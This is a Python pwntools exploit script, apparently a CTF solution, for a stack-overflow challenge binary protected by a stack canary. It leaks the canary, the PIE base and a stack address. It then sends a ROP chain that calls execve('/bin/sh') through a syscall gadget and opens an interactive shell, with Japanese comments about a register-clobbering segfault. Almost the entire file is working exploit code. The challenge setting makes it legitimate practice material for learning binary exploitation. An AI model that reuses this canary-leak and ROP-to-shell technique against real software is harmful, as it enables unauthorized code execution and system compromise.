#!/usr/bin/env python3
from pwn import *

bin_file = './chall_stack_w_ssp'
context(os = 'linux', arch = 'amd64')
# context(terminal = ['tmux', 'splitw', '-v'])
# context.log_level = 'debug'

binf = ELF(bin_file)
offset_main     = binf.functions['main'].address

def attack(conn, **kwargs):
    conn.sendafter('>> ', b'a'*0x18+b'!')
    conn.recvuntil('a!')
    canary = unpack(b'\x00' + conn.recv(7))
    info('canary        = 0x{:08x}'.format(canary))
    '''
    conn.sendafter('>> ', b'b'*0x3f+b'!')
    conn.recvuntil('b!')
    addr_stack = unpack(conn.recv(6), 'all') - 0x158
    info('addr_stack    = 0x{:08x}'.format(addr_stack))
    '''
    conn.sendafter('>> ', b'c'*0x37+b'!')
    conn.recvuntil('c!')
    addr_main    = unpack(conn.recv(6), 'all')
    binf.address = addr_main - offset_main
    info('addr_bin_base = 0x{:08x}'.format(binf.address))

    conn.sendafter('>> ', b'b'*0x47+b'!')
    conn.recvuntil('b!')
    addr_stack = unpack(conn.recv(6), 'all') - 0x1e8
    info('addr_stack    = 0x{:08x}'.format(addr_stack))

    rop = ROP(binf)

    exploit  = b'/bin/sh'.ljust(0x18, b'\x00')
    exploit += pack(canary)
    exploit += pack(0xdeadbeef)
    exploit += flat(rop.rdi.address, addr_stack)
    exploit += flat(rop.rsi.address, 0)
    exploit += flat(rop.rdx.address, 0) # rdxだけでなくrbxも書き換えてしまうため、SegFaultしてしまう。
    exploit += b''.ljust(0x8, b'\x00')
    #exploit += pack(addr_stack + 0x1f8) # 元々rbxに入っている値をpopするようにしたが、0をpopしても同じだった。
    exploit += flat(rop.rax.address, constants.SYS_execve)
    exploit += pack(rop.syscall.address)
    #print(exploit)
    #print(exploit.hex())
    conn.sendafter('>> ', exploit)

def main():
    #conn = gdb.debug(bin_file)
    conn = process(bin_file)
    attack(conn)
    conn.interactive()

if __name__=='__main__':
    main()
